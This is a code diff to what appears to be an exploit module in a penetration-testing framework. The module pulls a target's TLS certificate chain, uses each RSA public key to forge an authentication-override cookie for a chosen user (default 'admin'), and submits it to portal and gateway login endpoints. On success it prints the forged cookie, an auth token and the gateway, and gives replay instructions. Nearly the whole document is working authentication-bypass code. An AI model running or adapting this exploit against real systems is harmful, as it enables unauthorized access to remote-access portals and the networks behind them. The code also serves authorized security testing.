@@ -246,6 +246,24 @@ class Module(Auxiliary, Http_client):
             return []
         return [x509.load_der_x509_certificate(der_bytes)]
 
+    @staticmethod
+    def _cert_is_ca(cert: x509.Certificate) -> bool:
+        try:
+            basic = cert.extensions.get_extension_for_class(x509.BasicConstraints)
+            return bool(basic.value.ca)
+        except x509.ExtensionNotFound:
+            return False
+
+    @staticmethod
+    def _cert_label(cert: x509.Certificate) -> str:
+        public_key = cert.public_key()
+        key_bits = getattr(public_key, "key_size", "?")
+        key_type = "RSA" if isinstance(public_key, RSAPublicKey) else type(public_key).__name__
+        return (
+            f"{cert.subject.rfc4514_string()} "
+            f"({key_type} {key_bits} bits, CA={Module._cert_is_ca(cert)})"
+        )
+
     def _rsa_public_keys_from_chain(
         self,
         certs: List[x509.Certificate],
@@ -300,13 +318,12 @@ class Module(Auxiliary, Http_client):
     def _parse_portal_arguments(self, response_text: str) -> List[str]:
         return re.findall(r"<argument>(.*?)</argument>", response_text or "", re.I | re.S)
 
-    def _fetch_chain(self) -> List[Tuple[int, str, RSAPublicKey]]:
+    def _fetch_certs(self) -> List[x509.Certificate]:
         host = self._host_label()
         if not host:
             return []
         timeout = max(float(self.timeout or 10), 10.0)
-        certs = self._fetch_tls_certificate_chain(host, int(self.port), timeout=timeout)
-        return self._rsa_public_keys_from_chain(certs)
+        return self._fetch_tls_certificate_chain(host, int(self.port), timeout=timeout)
 
     def _post_login(self, cookie_b64: str, context_name: str) -> Tuple[Optional[object], str]:
         response = self.http_request(
@@ -321,23 +338,32 @@ class Module(Auxiliary, Http_client):
             return None, ""
         return response, response.text or ""
 
-    def _try_keys(self, announce_chain: bool = False) -> Tuple[bool, str, str, str]:
-        keys = self._fetch_chain()
-        if not keys:
-            return False, "", "", "Could not retrieve TLS certificate chain"
+    def _try_keys(
+        self,
+        announce_chain: bool = False,
+    ) -> Tuple[bool, str, str, str, str]:
+        certs = self._fetch_certs()
+        if not certs:
+            return False, "", "", "", "Could not retrieve TLS certificate chain"
 
         if announce_chain:
-            print_success(f"Found {len(keys)} RSA certificate(s) in chain")
-            for index, subject, public_key in keys:
-                print_info(f"  [{index}] {subject} ({public_key.key_size} bits)")
+            print_success(f"Found {len(certs)} certificate(s) in chain:")
+            for index, cert in enumerate(certs):
+                print_info(f"  [{index}] {self._cert_label(cert)}")
+
+        keys = self._rsa_public_keys_from_chain(certs)
+        if not keys:
+            return False, "", "", "", "No RSA public keys found in TLS certificate chain"
 
         username = self._opt(self.username) or "admin"
+        print_status(f"Forging cookie for user '{username}', testing each RSA key")
         for index, subject, public_key in keys:
             print_status(f"Trying certificate [{index}] {subject}")
             cookie_b64 = self._forge_auth_override_cookie(public_key, username)
             for context_name in self._contexts():
                 response, body = self._post_login(cookie_b64, context_name)
                 if not response:
+                    print_warning(f"{context_name} request failed for certificate [{index}]")
                     continue
 
                 if context_name == "gateway":
@@ -349,19 +375,26 @@ class Module(Auxiliary, Http_client):
                     print_info(f"{context_name} response ({response.status_code}):\n{body[:4000]}")
 
                 if accepted:
-                    detail = f"{context_name} accepted forged cookie from chain index {index}"
-                    return True, cookie_b64, context_name, detail
+                    host = self._host_label()
+                    detail = (
+                        f"{context_name.capitalize()} accepted the forged cookie "
+                        f"({host}:{int(self.port)})"
+                    )
+                    return True, cookie_b64, context_name, body, detail
 
-                print_warning(f"{context_name} rejected cookie from certificate [{index}]")
+                print_error(
+                    f"{context_name.capitalize()} did not accept the forged cookie "
+                    f"from certificate [{index}]"
+                )
 
-        return False, "", "", "No certificate in the TLS chain produced an accepted cookie"
+        return False, "", "", "", "No certificate in the TLS chain produced an accepted cookie"
 
     def check(self):
         host = self._host_label()
         if not host:
             return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
 
-        ok, cookie_b64, context_name, reason = self._try_keys()
+        ok, cookie_b64, context_name, _body, reason = self._try_keys()
         return {
             "vulnerable": ok,
             "reason": reason,
@@ -377,24 +410,20 @@ class Module(Auxiliary, Http_client):
             return False
 
         print_status(f"Retrieving TLS certificate chain from {host}:{int(self.port)}")
-        ok, cookie_b64, context_name, reason = self._try_keys(announce_chain=True)
+        ok, cookie_b64, context_name, body, reason = self._try_keys(announce_chain=True)
         if not ok:
             print_error(reason)
             return False
 
         username = self._opt(self.username) or "admin"
         print_success(reason)
-        print_success(f"Forged cookie ({context_name}): {cookie_b64}")
+        print_info(f"Cookie: {cookie_b64}")
 
-        _, body = self._post_login(cookie_b64, context_name)
         if context_name == "portal":
             args = self._parse_portal_arguments(body)
-            if len(args) > 1:
-                print_info(f"Auth token: {args[1]}")
-            if len(args) > 4:
-                print_info(f"Username:   {args[4]}")
-            if len(args) > 3:
-                print_info(f"Gateway:    {args[3]}")
+            print_info(f"Auth token: {args[1] if len(args) > 1 else 'N/A'}")
+            print_info(f"Username:   {args[4] if len(args) > 4 else 'N/A'}")
+            print_info(f"Gateway:    {args[3] if len(args) > 3 else 'N/A'}")
 
         print_info(f"Replay with user={username} and portal-userauthcookie on {self._login_path()}")
         return True
